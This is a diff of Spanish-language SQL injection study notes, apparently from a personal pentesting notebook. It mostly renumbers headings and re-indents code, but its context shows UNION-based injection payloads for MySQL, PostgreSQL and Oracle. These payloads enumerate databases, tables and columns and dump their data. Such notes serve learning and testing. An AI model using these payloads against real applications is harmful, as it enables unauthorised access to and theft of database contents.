@@ -258,7 +258,7 @@ CORROBORAMOS ESTO CON EL UNION
 
 #### UNION
 
-##### MYSQL-PostgreSQL
+##### MYSQL-PostgreSQL1
 
 ```python
 CODE_VULNERABLE' UNION SELECT NULL -- -
@@ -283,7 +283,7 @@ donde si colocamos  "NULL,NULL,NULL" daría error
 
 ## OBTENER LAS BASE DE DATOS DISPONIBLES
 
-### MYSQL-PostgreSQL
+### MYSQL-PostgreSQL2
 
 ```SQL
 code' UNION SELECT schema_name FROM information_schema.schemata -- -
@@ -291,7 +291,7 @@ code' UNION SELECT schema_name FROM information_schema.schemata -- -
 
 ![[Pasted image 20241030182002.png]]
 
-### ORACLE
+### ORACLE 1
 
 !!!!solo puedes ver la base de datos en la que estas !!!
 
@@ -304,7 +304,7 @@ code' UNION SYS_CONTEXT('USERENV', 'DB_NAME') FROM DUAL -- -
 
 ## OBTENER TABLAS DE LA BASE DE DATOS
 
-### MYSQL-PostgreSQL
+### MYSQL-PostgreSQL 3
 
 ```SQL
 code' UNION SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema='*name-database' -- -
@@ -312,7 +312,7 @@ code' UNION SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema=
 
 ![[Pasted image 20241030184826.png]]
 
-### ORACLE
+### ORACLE 2
 
 ```PYTHON
 code' UNION SELECT TABLE_NAME FROM USER_TABLES -- -
@@ -325,7 +325,7 @@ code' UNION SELECT OWNER,TABLE_NAME FROM DBA_TABLES -- -
 
 ## OBTENER COLUMNAS DE LA BASE DE DATOS
 
-### MYSQL-PostgreSQL
+### MYSQL-PostgreSQL 4
 
 ```SQL
 code' UNION SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_NAME='*nombre-tabla*' -- -
@@ -333,7 +333,7 @@ code' UNION SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_NAME=
 
 ![[Pasted image 20241030184659.png]]
 
-### ORACLE
+### ORACLE 3
 
 EN TODOS LOS CASOS SE PUEDE SACAR MAS INFORMACION DE LA TABLA
 
@@ -352,9 +352,9 @@ code' UNION SELECT COLUMN_NAME FROM DBA_TAB_COLUMNS WHERE TABLE_NAME='*nombre-ta
 
 ![[Pasted image 20241030225403.png]]
 
-## OBTENER COLUMNAS DE LA BASE DE DATOS
+## OBTENER COLUMNAS DE LA BASE DE DATOS 2
 
-### MYSQL-PostgreSQL
+### MYSQL-PostgreSQL 5
 
 ```SQL
 code' UNION SELECT COLUMNA1,COLUMNA2 FROM *table-name*  -- -
@@ -362,7 +362,7 @@ code' UNION SELECT COLUMNA1,COLUMNA2 FROM *table-name*  -- -
 
 ![[Pasted image 20241030190322.png]]
 
-### ORACLE
+### ORACLE 4
 
 ```SQL
 code' UNION SELECT COLUMNA1,COLUMNA2 FROM *table-name*  -- -
@@ -456,33 +456,33 @@ En SQL, para obtener la longitud del resultado de una consulta, puedes usar func
 
 1. **En MySQL**: Puedes usar la función `LENGTH()` para medir el número de bytes, o `CHAR_LENGTH()` para medir el número de caracteres.
 
-```sql
-SELECT LENGTH(user) AS longitud_en_bytes,CHAR_LENGTH(user) AS longitud_en_caracteres
-FROM users WHERE user = 'pepe';
-```
+    ```sql
+    SELECT LENGTH(user) AS longitud_en_bytes,CHAR_LENGTH(user) AS longitud_en_caracteres
+    FROM users WHERE user = 'pepe';
+    ```
 
-- **`LENGTH(user)`** devuelve la longitud en bytes.
-- **`CHAR_LENGTH(user)`** devuelve la longitud en caracteres.
+    - **`LENGTH(user)`** devuelve la longitud en bytes.
+    - **`CHAR_LENGTH(user)`** devuelve la longitud en caracteres.
 
-   **Nota**: Si `user` contiene caracteres multibyte (como en UTF-8), `LENGTH()` puede devolver un valor mayor que `CHAR_LENGTH()`.
+      **Nota**: Si `user` contiene caracteres multibyte (como en UTF-8), `LENGTH()` puede devolver un valor mayor que `CHAR_LENGTH()`.
 
 2. **En SQL Server**: Utiliza la función `LEN()` para obtener la longitud en caracteres.
 
-```sql
-SELECT LEN(user) AS longitud FROM users WHERE user = 'pepe';
-```
+    ```sql
+    SELECT LEN(user) AS longitud FROM users WHERE user = 'pepe';
+    ```
 
 3. **En PostgreSQL**: Usa la función `LENGTH()` para obtener la longitud en caracteres.
 
-```sql
-SELECT LENGTH(user) AS longitud FROM users WHERE user = 'pepe';
-```
+    ```sql
+    SELECT LENGTH(user) AS longitud FROM users WHERE user = 'pepe';
+    ```
 
 4. **En Oracle**: Usa la función `LENGTH()` para obtener la longitud en caracteres.
 
-```sql
-SELECT LENGTH(user) AS longitud FROM users WHERE user = 'pepe';
-```
+    ```sql
+    SELECT LENGTH(user) AS longitud FROM users WHERE user = 'pepe';
+    ```
 
 EJEMPLO:
 
